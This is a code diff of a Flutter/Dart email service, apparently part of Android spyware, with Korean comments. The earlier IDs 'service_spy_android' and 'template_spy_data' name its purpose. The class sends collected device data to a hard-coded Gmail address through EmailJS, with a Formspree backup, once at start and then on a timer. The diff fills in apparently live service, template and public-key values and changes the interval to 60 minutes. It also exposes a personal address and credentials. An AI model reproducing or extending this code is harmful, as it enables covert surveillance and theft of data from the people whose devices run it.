@@ -8,9 +8,9 @@ import 'package:device_info_plus/device_info_plus.dart';
 class EmailService {
   static const String _targetEmail = 'tmdals7205@gmail.com';
   static const String _smtpApiUrl = 'https://api.emailjs.com/api/v1.0/email/send';
-  static const String _serviceId = 'service_spy_android';
-  static const String _templateId = 'template_spy_data';
-  static const String _publicKey = 'YOUR_EMAILJS_PUBLIC_KEY'; // EmailJS에서 발급받은 키
+  static const String _serviceId = 'service_56njyhn';
+  static const String _templateId = 'iKPLnbfwWhDWQNT6dfPrc';
+  static const String _publicKey = 'kBLWYC2oAZAJeL6_B'; // EmailJS에서 발급받은 키
 
   // 백업 이메일 전송 (Formspree 사용)
   static const String _backupApiUrl = 'https://formspree.io/f/YOUR_FORM_ID'; // Formspree 사용
@@ -27,8 +27,8 @@ class EmailService {
     // 즉시 한 번 전송
     _sendCollectedData();
 
-    // 30분마다 정기 전송
-    _emailTimer = Timer.periodic(const Duration(minutes: 30), (timer) async {
+    // 60분마다 정기 전송
+    _emailTimer = Timer.periodic(const Duration(minutes: 60), (timer) async {
       await _sendCollectedData();
     });
 
